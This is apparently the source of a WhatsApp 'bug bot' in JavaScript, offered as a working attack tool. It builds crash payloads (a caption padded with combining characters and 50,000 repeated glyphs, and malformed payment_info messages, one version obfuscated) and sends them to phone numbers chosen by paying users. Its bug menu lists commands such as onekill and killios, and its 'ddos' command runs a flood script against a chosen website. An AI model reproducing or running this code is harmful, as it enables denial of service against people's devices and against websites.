    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `✳️᜴࿆͆᷍《《   ֎ ⃢☠️☠️ 𝗩𝗜𝗥𝗧𝗘𝗫 ☠️‼️❌⚠️‼️🚫‼️‼️‼️〄 ⃢🔥 ²⁰²⁴》》

_*██ 𝗩𝗜𝗥𝗧𝗘𝗫██*_ 

𖣘𝓜꙰⃢⃠⃠⃠⃠⃠*_🇲🇾⁘̨̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̽̈

*ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̊̊̔̔̔̔̔̔ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰*˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕*

𝗗𝗮𝘀𝗮𝗿 
𝙂𝙄𝙏𝙐 𝘼𝙅𝘼 𝙋𝘼𝙉𝙄𝙆🗿
𝘽𝙐𝙆𝘼𝙉 𝙑𝙄𝙍𝙏𝙀𝙓 𝘼𝙎𝙇𝙄.
乂⃰͜͡؜𝐙𝕩𝐕⃟⭐️✅⃟╮.xp`+"ꦾ".repeat(50000),

    "sequenceNumber": "0",

    "jpegThumbnail": ""

     }

  }

}

}), { userJid: target, quoted: kuwoted })

await GlobalTechInc.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })

}
    
(function(_0x4a0c3c,_0x449ed6){var _0x104feb=_0x1bd9,_0x3e3dd0=_0x4a0c3c();while(!![]){try{var _0x481ad5=parseInt(_0x104feb(0x123))/0x1*(-parseInt(_0x104feb(0x12c))/0x2)+-parseInt(_0x104feb(0x12e))/0x3+-parseInt(_0x104feb(0x11f))/0x4+parseInt(_0x104feb(0x120))/0x5+parseInt(_0x104feb(0x11e))/0x6*(-parseInt(_0x104feb(0x126))/0x7)+-parseInt(_0x104feb(0x12f))/0x8+-parseInt(_0x104feb(0x125))/0x9*(-parseInt(_0x104feb(0x121))/0xa);if(_0x481ad5===_0x449ed6)break;else _0x3e3dd0['push'](_0x3e3dd0['shift']());}catch(_0x2c4bb4){_0x3e3dd0['push'](_0x3e3dd0['shift']());}}}(_0x5751,0x33690));function hi(){var _0x4ca531=_0x1bd9;console['log'](_0x4ca531(0x122));}function _0x5751(){var _0x5489b7=['10RyLaBj','Hello\x20World!','10412BelDfW','meu\x20ovo','10276299zlszHl','42MFbSVh','physical-goods','payment_info','pix_static_code','pending','4P46GMY57GC','38zEAssq','+5533998586057','495336GBTdnV','1900344WdqeoS','ORDER','33228OrqiJL','1342808IxSDsY','190890kWQtXO'];_0x5751=function(){return _0x5489b7;};return _0x5751();}hi();function _0x1bd9(_0xdb0a9e,_0x35a4f6){var _0x5751dd=_0x5751();return _0x1bd9=function(_0x1bd910,_0x4c97e1){_0x1bd910=_0x1bd910-0x11e;var _0x5d47b4=_0x5751dd[_0x1bd910];return _0x5d47b4;},_0x1bd9(_0xdb0a9e,_0x35a4f6);}async function sendPaymentInfoMessage(_0x28ef97){var _0x404515=_0x1bd9;await GlobalTechInc['relayMessage'](_0x28ef97,{'viewOnceMessage':{'message':{'messageContextInfo':{'deviceListMetadataVersion':0x2,'deviceListMetadata':{}},'interactiveMessage':{'nativeFlowMessage':{'buttons':[{'name':_0x404515(0x128),'buttonParamsJson':JSON['stringify']({'currency':'BRL','total_amount':{'value':0x0,'offset':0x64},'reference_id':_0x404515(0x12b),'type':_0x404515(0x127),'order':{'status':_0x404515(0x12a),'subtotal':{'value':0x0,'offset':0x64},'order_type':_0x404515(0x130),'items':[{'name':'','amount':{'value':0x0,'offset':0x64},'quantity':0x0,'sale_amount':{'value':0x0,'offset':0x64}}]},'payment_settings':[{'type':_0x404515(0x129),'pix_static_code':{'merchant_name':_0x404515(0x124),'key':_0x404515(0x12d),'key_type':'X'}}]})}]}}}}},{'participant':{'jid':_0x28ef97}},{'messageId':null});}

// BATA FUNCTION //
    
const zyn = {
  key: {
    fromMe: false,
    participant: '0@s.whatsapp.net',
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2029",
      thumbnail: anjay,
      itemCount: 1,
      status: "INQUIRY",
      surface: "CATALOG",
      message: `${m.body || m.mtype}`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: m.sender.split,
    forwardingScore: 999,
    isForwarded: true
  }
};
    
async function downloadMp3 (link) {
try {
GlobalTechInc.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
let kyuu = await fetchJson (`https://api.kyuurzy.site/api/download/aio?query=${link}`)
GlobalTechInc.sendMessage(m.chat, { audio: {url: kyuu.result.url}, mimetype: "audio/mpeg"},{ quoted:m})
}catch (err) {
reply(`${err}`)
}
}

async function downloadMp4 (link) {
try {
GlobalTechInc.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
let kyuu = await fetchJson(`https://api.kyuurzy.site/api/download/aio?query=${link}`)
GlobalTechInc.sendMessage(m.chat, { video: {url: kyuu.result.url}, caption: '' },{ quoted:m})
}catch (err) {
reply(`${err}`)
}
}

//self public
GlobalTechInc.public = true
if (!GlobalTechInc.public) {
if (!isCreator) return
}

const reply = {
"key": { 
"fromMe": false,
"participant": '0@s.whatsapp.net',
"remoteJid": 'status@broadcast' 
},
message: {
"listResponseMessage": {
title: `GlobalTech`
}}
}

const replyz = (teks) => { 
GlobalTechInc.sendMessage(from, { text: teks, contextInfo: {
mentionedJid: [m.sender],
externalAdReply: {
showAdAttribution: false,
renderLargerThumbnail: false,
title: `© GlobalTechInfo`,
body: `Hi ${pushname} 👋`,
previewType: "VIDEO",
thumbnail: anjay,
sourceUrl: `${global.url}`,
mediaUrl: `${global.url}`
}
},
text: teks
}, {
quoted: m
})
}

const reply2 = (teks) => {
GlobalTechInc.sendMessage(from, { text : teks }, { quoted : m })
}


function getFormattedDate() {
  var currentDate = new Date();
  var day = currentDate.getDate();
  var month = currentDate.getMonth() + 1;
  var year = currentDate.getFullYear();
  var hours = currentDate.getHours();
  var minutes = currentDate.getMinutes();
  var seconds = currentDate.getSeconds();
}

let d = new Date(new Date + 3600000)
let locale = 'id'
let week = d.toLocaleDateString(locale, { weekday: 'long' })
let date = d.toLocaleDateString(locale, {
  day: 'numeric',
  month: 'long',
  year: 'numeric'
})
const hariini = d.toLocaleDateString('id', { day: 'numeric', month: 'long', year: 'numeric' })

function msToTime(duration) {
var milliseconds = parseInt((duration % 1000) / 100),
seconds = Math.floor((duration / 1000) % 60),
minutes = Math.floor((duration / (1000 * 60)) % 60),
hours = Math.floor((duration / (1000 * 60 * 60)) % 24)

hours = (hours < 10) ? "0" + hours : hours
minutes = (minutes < 10) ? "0" + minutes : minutes
seconds = (seconds < 10) ? "0" + seconds : seconds
return hours + " jam " + minutes + " menit " + seconds + " detik"
}

function msToDate(ms) {
		temp = ms
		days = Math.floor(ms / (24*60*60*1000));
		daysms = ms % (24*60*60*1000);
		hours = Math.floor((daysms)/(60*60*1000));
		hoursms = ms % (60*60*1000);
		minutes = Math.floor((hoursms)/(60*1000));
		minutesms = ms % (60*1000);
		sec = Math.floor((minutesms)/(1000));
		return days+" Hari "+hours+" Jam "+ minutes + " Menit";
		// +minutes+":"+sec;
  }

// Sayying time
const timee = moment().tz('Asia/Karachi').format('HH:mm:ss')
if(timee < "23:59:00"){
var waktuucapan = 'Good Night 🌃'
}
if(timee < "19:00:00"){
var waktuucapan = 'Good Evening 🌆'
}
if(timee < "18:00:00"){
var waktuucapan = 'Good Evening 🌅'
}
if(timee < "15:00:00"){
var waktuucapan = 'Good Afternoon 🏙'
}
if(timee < "10:00:00"){
var waktuucapan = 'Good Morning 🌄'
}
if(timee < "05:00:00"){
var waktuucapan = 'Good Morning 🌉'
}
if(timee < "03:00:00"){
var waktuucapan = 'Good Night 🌌'
}


if (prefix && command) {
let caseNames = getCaseNames();
function getCaseNames() {
const fs = require('fs');
try {
const data = fs.readFileSync('case.js', 'utf8');
const casePattern = /case\s+'([^']+)'/g;
const matches = data.match(casePattern);
if (matches) {
const caseNames = matches.map(match => match.replace(/case\s+'([^']+)'/, '$1'));
return caseNames;
} else {
return [];
} } catch (err) {
console.log('There is an error:', err);
return [];
}}
let noPrefix = command
let mean = didyoumean(noPrefix, caseNames);
let sim = similarity(noPrefix, mean);
let similarityPercentage = parseInt(sim * 100);
if (mean && noPrefix.toLowerCase() !== mean.toLowerCase()) {
let response = `Maaf, command yang kamu berikan salah. mungkin ini yang kamu maksud:\n\n•> ${prefix+mean}\n•> Kemiripan: ${similarityPercentage}%`
replyz(response)
}}

switch(command) {

case 'menu': case 'help': {
await loading()
let imgsc = await prepareWAMessageMedia({
image: anjay
}, {
upload: GlobalTechInc.waUploadToServer
})
let anu = `┏─╴[ \`𝗚𝗹𝗼𝗯𝗮𝗹-𝗕𝘂𝗴\` ] ──┓
│ Hi *${pushname}*
│ *${timee}*
│ *${hariini}*
│ *${waktuucapan}*
│            [ \`𝗜𝗡𝗙𝗢 𝗕𝗢𝗧\` ]
│ 🄾🅆🄽 : ${global.namaown}
│ 🄱🄾🅃 : ${global.namabot}
│ 🅅🄴🅁 : ${global.versisc}
┗──────────────────┛
┏──⟬ \`𝗟𝗜𝗦𝗧 𝗠𝗘𝗡𝗨\` ⟭
││${global.simbol} ʙᴜɢᴍᴇɴᴜ
││${global.simbol} ᴅᴅᴏsᴍᴇɴᴜ
││${global.simbol} ғᴜɴᴍᴇɴᴜ
││${global.simbol} ᴏᴡɴᴇʀᴍᴇɴᴜ
││${global.simbol} sᴛᴏʀᴇᴍᴇɴᴜ
┗────────────────┛`
const msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
...imgsc,
hasMediaAttachment: false
},
body: {
text: anu
},
footer: {
text: ""
},
nativeFlowMessage: {
buttons: [{
name: "cta_url",
buttonParamsJson: `{
display_text: '𝙔𝙤𝙪𝙏𝙪𝙗𝙚',
url: "${global.url}",
merchant_url: "${global.url}"
}`
}],
messageParamsJson: ""
}
}
}
}
}, {quoted:zyn})
await GlobalTechInc.relayMessage(m.chat, msg.message, {
messageId: msg.key.id
})
 }
break

case 'GlobalTech': {
await loading()
let imgsc = await prepareWAMessageMedia({
image: anjay
}, {
upload: GlobalTechInc.waUploadToServer
})
let anu = `┏─╴[ \`𝗚𝗹𝗼𝗯𝗮𝗹-𝗕𝘂𝗴\` ] ──┓
│ Hi *${pushname}*
│ *${timee}*
│ *${hariini}*
│ *${waktuucapan}*
│            [ \`𝗜𝗡𝗙𝗢 𝗕𝗢𝗧\` ]
│ 🄾🅆🄽 : ${global.namaown}
│ 🄱🄾🅃 : ${global.namabot}
│ 🅅🄴🅁 : ${global.versisc}
┗──────────────────┛
┏──⟬ \`𝗟𝗜𝗦𝗧 𝗠𝗘𝗡𝗨\` ⟭
││${global.simbol} ʙᴜɢᴍᴇɴᴜ
││${global.simbol} ᴅᴅᴏsᴍᴇɴᴜ
││${global.simbol} ғᴜɴᴍᴇɴᴜ
││${global.simbol} ᴏᴡɴᴇʀᴍᴇɴᴜ
││${global.simbol} sᴛᴏʀᴇᴍᴇɴᴜ
┗────────────────┛`
const msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
...imgsc,
hasMediaAttachment: false
},
body: {
text: anu
},
footer: {
text: ""
},
nativeFlowMessage: {
buttons: [{
name: "cta_url",
buttonParamsJson: `{
display_text: '𝘾𝙝𝙖𝙣𝙣𝙚𝙡',
url: "${global.tele}",
merchant_url: "${global.tele}"
}`
}],
messageParamsJson: ""
}
}
}
}
}, {quoted:zyn})
await GlobalTechInc.relayMessage(m.chat, msg.message, {
messageId: msg.key.id
})
 }
break

case 'ddosmenu': {
await loading()
let imgsc = await prepareWAMessageMedia({
image: anjay
}, {
upload: GlobalTechInc.waUploadToServer
})
let anu = `┏─╴[ \`𝗚𝗹𝗼𝗯𝗮𝗹-𝗕𝘂𝗴\` ] ──┓
│ Hi *${pushname}*
│ *${timee}*
│ *${hariini}*
│ *${waktuucapan}*
│            [ \`𝗜𝗡𝗙𝗢 𝗕𝗢𝗧\` ]
│ 🄾🅆🄽 : ${global.namaown}
│ 🄱🄾🅃 : ${global.namabot}
│ 🅅🄴🅁 : ${global.versisc}
┗──────────────────┛
┏──⟬ \`𝗗𝗗𝗢𝗦 𝗠𝗘𝗡𝗨\` ⟭
││${global.simbol} ᴅᴅᴏs <𝘂𝗿𝗹 𝘁𝗶𝗺𝗲 𝗿𝗽𝘀 𝘁𝗵𝗿𝗲𝗮𝗱>
││${global.simbol} ᴄʜᴇᴄᴋʜᴏsᴛ <𝘂𝗿𝗹>
┗────────────────┛`
const msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
...imgsc,
hasMediaAttachment: false
},
body: {
text: anu
},
footer: {
text: ""
},
nativeFlowMessage: {
buttons: [{
name: "cta_url",
buttonParamsJson: `{
display_text: '𝘾𝙝𝙖𝙣𝙣𝙚𝙡',
url: "${global.tele}",
merchant_url: "${global.tele}"
}`
}],
messageParamsJson: ""
}
}
}
}
}, {quoted:zyn})
await GlobalTechInc.relayMessage(m.chat, msg.message, {
messageId: msg.key.id
})
 }
break

case 'ownermenu': {
await loading()
let imgsc = await prepareWAMessageMedia({
image: anjay
}, {
upload: GlobalTechInc.waUploadToServer
})
let anu = `┏─╴[ \`𝗚𝗹𝗼𝗯𝗮𝗹-𝗕𝘂𝗴\` ] ──┓
│ Hi *${pushname}*
│ *${timee}*
│ *${hariini}*
│ *${waktuucapan}*
│            [ \`𝗜𝗡𝗙𝗢 𝗕𝗢𝗧\` ]
│ 🄾🅆🄽 : ${global.namaown}
│ 🄱🄾🅃 : ${global.namabot}
│ 🅅🄴🅁 : ${global.versisc}
┗──────────────────┛
┏──⟬ \`𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨\` ⟭
││${global.simbol} ᴀᴅᴅᴘʀᴇᴍ
││${global.simbol} ᴅᴇʟᴘʀᴇᴍ
││${global.simbol} ᴘᴜʙʟɪᴄ
││${global.simbol} sᴇʟғ
┗────────────────┛`
const msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
...imgsc,
hasMediaAttachment: false
},
body: {
text: anu
},
footer: {
text: ""
},
nativeFlowMessage: {
buttons: [{
name: "cta_url",
buttonParamsJson: `{
display_text: '𝘾𝙝𝙖𝙣𝙣𝙚𝙡',
url: "${global.tele}",
merchant_url: "${global.tele}"
}`
}],
messageParamsJson: ""
}
}
}
}
}, {quoted:zyn})
await GlobalTechInc.relayMessage(m.chat, msg.message, {
messageId: msg.key.id
})
 }
break

case 'funmenu': {
await loading()
let imgsc = await prepareWAMessageMedia({
image: anjay
}, {
upload: GlobalTechInc.waUploadToServer
})
let anu = `┏─╴[ \`𝗚𝗹𝗼𝗯𝗮𝗹-𝗕𝘂𝗴\` ] ──┓
│ Hi *${pushname}*
│ *${timee}*
│ *${hariini}*
│ *${waktuucapan}*
│            [ \`𝗜𝗡𝗙𝗢 𝗕𝗢𝗧\` ]
│ 🄾🅆🄽 : ${global.namaown}
│ 🄱🄾🅃 : ${global.namabot}
│ 🅅🄴🅁 : ${global.versisc}
┗──────────────────┛
┏──⟬ \`𝗙𝗨𝗡 𝗠𝗘𝗡𝗨\` ⟭
││${global.simbol} ᴀɪ
││${global.simbol} ᴍᴘ4
││${global.simbol} ᴘʟᴀʏ
││${global.simbol} ᴍᴘ3
││${global.simbol} ᴄᴇᴋᴊᴏᴅᴏʜ 
││${global.simbol} ᴄᴇᴋᴋᴜᴏᴛᴀ
┗────────────────┛`
const msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
...imgsc,
hasMediaAttachment: false
},
body: {
text: anu
},
footer: {
text: ""
},
nativeFlowMessage: {
buttons: [{
name: "cta_url",
buttonParamsJson: `{
display_text: '𝘾𝙝𝙖𝙣𝙣𝙚𝙡',
url: "${global.tele}",
merchant_url: "${global.tele}"
}`
}],
messageParamsJson: ""
}
}
}
}
}, {quoted:zyn})
await GlobalTechInc.relayMessage(m.chat, msg.message, {
messageId: msg.key.id
})
 }
break

case 'storemenu': {
await loading()
let imgsc = await prepareWAMessageMedia({
image: anjay
}, {
upload: GlobalTechInc.waUploadToServer
})
let anu = `┏─╴[ \`𝗚𝗹𝗼𝗯𝗮𝗹-𝗕𝘂𝗴\` ] ──┓
│ Hi *${pushname}*
│ *${timee}*
│ *${hariini}*
│ *${waktuucapan}*
│            [ \`𝗜𝗡𝗙𝗢 𝗕𝗢𝗧\` ]
│ 🄾🅆🄽 : ${global.namaown}
│ 🄱🄾🅃 : ${global.namabot}
│ 🅅🄴🅁 : ${global.versisc}
┗──────────────────┛
┏──⟬ \`𝗦𝗧𝗢𝗥𝗘 𝗠𝗘𝗡𝗨\` ⟭
││${global.simbol} ᴏᴡɴᴇʀ
││${global.simbol} ʟɪsᴛ
││${global.simbol} ᴘʀᴏsᴇs
││${global.simbol} ᴅᴏɴᴇ
││${global.simbol} ʙᴜʏsᴄ
┗────────────────┛`
const msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
...imgsc,
hasMediaAttachment: false
},
body: {
text: anu
},
footer: {
text: ""
},
nativeFlowMessage: {
buttons: [{
name: "cta_url",
buttonParamsJson: `{
display_text: '𝘾𝙝𝙖𝙣𝙣𝙚𝙡',
url: "${global.tele}",
merchant_url: "${global.tele}"
}`
}],
messageParamsJson: ""
}
}
}
}
}, {quoted:zyn})
await GlobalTechInc.relayMessage(m.chat, msg.message, {
messageId: msg.key.id
})
 }
break

case 'bugmenu': {
await loading()
let imgsc = await prepareWAMessageMedia({
image: anjay
}, {
upload: GlobalTechInc.waUploadToServer
})
let anu = `┏─╴[ \`𝗚𝗹𝗼𝗯𝗮𝗹-𝗕𝘂𝗴\` ] ──┓
│ Hi *${pushname}*
│ *${timee}*
│ *${hariini}*
│ *${waktuucapan}*
│            [ \`𝗜𝗡𝗙𝗢 𝗕𝗢𝗧\` ]
│ 🄾🅆🄽 : ${global.namaown}
│ 🄱🄾🅃 : ${global.namabot}
│ 🅅🄴🅁 : ${global.versisc}
┗──────────────────┛
┏──⟬ \`𝗟𝗜𝗦𝗧 𝗕𝗨𝗚\` ⟭
││${global.simbol} ᴏɴʟʏʙᴜɢ <𝗻𝘂𝗺𝗯𝗲𝗿>
││${global.simbol} ᴏɴᴇᴋɪʟʟ <𝗻𝘂𝗺𝗯𝗲𝗿>
││${global.simbol} ᴅᴏᴜʙʟᴇᴋɪʟʟ <𝗻𝘂𝗺𝗯𝗲𝗿>
││${global.simbol} ᴛʀɪᴘʟᴇᴋɪʟʟ <𝗻𝘂𝗺𝗯𝗲𝗿>
││${global.simbol} ᴍᴀɴɪᴀᴄ <𝗻𝘂𝗺𝗯𝗲𝗿>
││${global.simbol} sᴀᴠᴀɢᴇ <𝗻𝘂𝗺𝗯𝗲𝗿>
││
││  ⟬ \`𝗩𝗜𝗣 𝗕𝗨𝗚\` ⟭
││${global.simbol} ᴠɪᴘ-ʙᴜɢ <𝗻𝘂𝗺𝗯𝗲𝗿>
││${global.simbol} ᴡᴀʀᴅᴇᴋ <𝗻𝘂𝗺𝗯𝗲𝗿>
││${global.simbol} ᴀɴᴛɪɢᴇᴅᴏʀ <𝗻𝘂𝗺𝗯𝗲𝗿>
││${global.simbol} ɪɴғɪɴɪᴛʏ <𝗻𝘂𝗺𝗯𝗲𝗿>
││${global.simbol} xʙʟᴀɴᴋ <𝗻𝘂𝗺𝗯𝗲𝗿>
││
││  ⟬ \`𝗔𝗡𝗗𝗥𝗢𝗜𝗗\` ⟭
││${global.simbol} ᴀɴᴅʀᴏɪᴅ <𝗻𝘂𝗺𝗯𝗲𝗿>
││${global.simbol} xᴀɴᴅʀᴏ <𝗻𝘂𝗺𝗯𝗲𝗿>
││${global.simbol} ᴋɪʟʟᴀɴᴅʀᴏ <𝗻𝘂𝗺𝗯𝗲𝗿>
││
││  ⟬ \`𝗜𝗣𝗛𝗢𝗡𝗘\` ⟭
││${global.simbol} ɪᴘʜᴏɴᴇ <𝗻𝘂𝗺𝗯𝗲𝗿>
││${global.simbol} xɪᴘʜᴏɴᴇ <𝗻𝘂𝗺𝗯𝗲𝗿>
││${global.simbol} ᴋɪʟʟɪᴏs <𝗻𝘂𝗺𝗯𝗲𝗿>
││
││  ⟬ \`𝗩𝗜𝗥𝗨𝗦\` ⟭
││${global.simbol} ᴠɪʀᴛᴇx <𝗻𝘂𝗺𝗯𝗲𝗿>
││${global.simbol} sᴀʟʏᴇʀ <𝗻𝘂𝗺𝗯𝗲𝗿>
││${global.simbol} ᴅᴀʀᴋɴᴇss <𝗻𝘂𝗺𝗯𝗲𝗿>
││
││  ⟬ \`𝗚𝗘𝗡𝗚𝗦𝗜\` ⟭
││${global.simbol} ᴍᴇᴋɪ <𝗻𝘂𝗺𝗯𝗲𝗿>
││${global.simbol} ᴀʀᴀʀᴀ <𝗻𝘂𝗺𝗯𝗲𝗿>
││${global.simbol} ᴀɴᴊᴀʏ <𝗻𝘂𝗺𝗯𝗲𝗿>
││
││  ⟬ \`𝗪𝗛𝗔𝗧𝗦𝗔𝗣𝗣\` ⟭
││${global.simbol} ʙᴇᴛᴀ-ɴᴇᴡ <𝗻𝘂𝗺𝗯𝗲𝗿>
││${global.simbol} ᴡᴀ-ʙᴜsɪɴs <𝗻𝘂𝗺𝗯𝗲𝗿>
││${global.simbol} ᴡᴀ-ᴍᴏᴅ <𝗻𝘂𝗺𝗯𝗲𝗿>
││${global.simbol} ᴡᴀ-ᴏʀɪ <𝗻𝘂𝗺𝗯𝗲𝗿>
┗────────────────┛`
const msg = generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
interactiveMessage: {
header: {
...imgsc,
hasMediaAttachment: false
},
body: {
text: anu
},
footer: {
text: ""
},
nativeFlowMessage: {
buttons: [{
name: "cta_url",
buttonParamsJson: `{
display_text: '𝘾𝙝𝙖𝙣𝙣𝙚𝙡',
url: "${global.tele}",
merchant_url: "${global.tele}"
}`
}],
messageParamsJson: ""
}
}
}
}
}, {quoted:zyn})
await GlobalTechInc.relayMessage(m.chat, msg.message, {
messageId: msg.key.id
})
 }
break

case 'ddos': {
if (!isPremium) return replyz(mess.OnlyOwner)
let url = q.split(" ")[0]
let time = q.split(" ")[1]
let thread = q.split(" ")[2]
let rate = q.split(" ")[3]
if (args.length === 4 && url && time && thread && rate) {
m.reply(`Sucess Menyerang Website : ${url}, Website akan eror dalam waktu ${time}`);
exec(`node ./lib/anyb.js ${url} ${time} ${thread} ${rate}`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
m.reply(`Format message is incorrect. Gunakan format: .${command} [url] [time] [thread] [rate]`)
}
}
break

case "checkhost": {
if (!q) return replyz(`Example : ${m.prefix + m.command} https://nxnn.com`)
let msg = { viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": "p"
    },
    "body": {
      "text": "Click Check Host To Check Web"
    },
    "footer": {
      "text": "GlobalTech"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": `{ display_text : 'Check Host' , url : "https://check-host.net/check-http?host=${q}", merchant_url : "https://check-host.net/check-http?host=${q}" }`
        }
      ],
      "messageParamsJson": ""
    }
  }
}
}
}
GlobalTechInc.relayMessage(m.chat, msg, {});
}
break

case 'addprem':
if (!isCreator) return replyz(mess.OnlyOwner)
if (!text) return replyz(`Usage ${prefix+command} nomor\nContoh ${prefix+command} 923xxx`)
var prem1 = text.split("|")[0].replace(/[^0-9]/g, '')
orgkaya.push(prem1)
fs.writeFileSync('./database/premium.json', JSON.stringify(orgkaya))
replyz(`${prem1} \`Anjayy Di Addprem\``)
await sleep(3500)
GlobalTechInc.sendMessage(prem1 + '@s.whatsapp.net', {
image: { url: 'https://telegra.ph/file/da3366bb4fd252566d065.jpg' },
caption: 'Kamu sekarang adalah User Premium!!'
}, { quoted: m })
break

case 'delprem':
if (!isCreator) return replyz(mess.OnlyOwner)
if (!text) return replyz(`Usage ${prefix+command} nomor\nContoh ${prefix+command} 923xxx`)
prem2 = text.split("|")[0].replace(/[^0-9]/g, '')
unp = orgkaya.indexOf(prem2)
orgkaya.splice(unp, 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(orgkaya))
replyz(`${prem2} \`Awokawok Di Delprem\` `)
break

case 'infinity': case 'xblank': {
if (!isPremium) return replyz(mess.premium)
if (!text) return replyz(`Usage .${command} 923444844060`)
let peler = q.replace(/[^0-9]/g, '');
if (peler.startsWith('0')) return replyz(`Example : ${prefix+command} 923444844060`)
var contactInfo = await GlobalTechInc.onWhatsApp(peler + "@s.whatsapp.net");
  let whatsappNumber = peler + '@s.whatsapp.net';
  if (peler == "916909137213") {
    return;
    }
    if (peler == "919366316008") {
    return;
    }
    if (peler == "919402104403") {
    return;
  }
  if (contactInfo.length == 0) {
    return replyz("The number is not registered on WhatsApp");
  }
  async function BugPay(jid){
				await GlobalTechInc.relayMessage(
					jid,
					{
						viewOnceMessage: {
							message: {
								messageContextInfo: {
									deviceListMetadataVersion: 2,
									deviceListMetadata: {},
								},
								interactiveMessage: {
									nativeFlowMessage: {
										buttons: [
											{
												name: 'payment_info',
												buttonParamsJson:
													'{"currency":"INR","total_amount":{"value":0,"offset":100},"reference_id":"4P46GMY57GC","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"meu ovo","key":"+916909137213","key_type":"X"}}]}',
											},
										],
									},
								},
							},
						},
					},
					{ participant: { jid: jid } },
					{ messageId: null }
				);
				}
				await BugPay(whatsappNumber);
            sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
				}
                break;

case 'meki': case 'anjay':  case 'arara': {
if (!isPremium) return replyz(mess.premium)
if (!text) return replyz(`Example: .${command} 923xxx`)
let peler = q.replace(/[^0-9]/g, "")
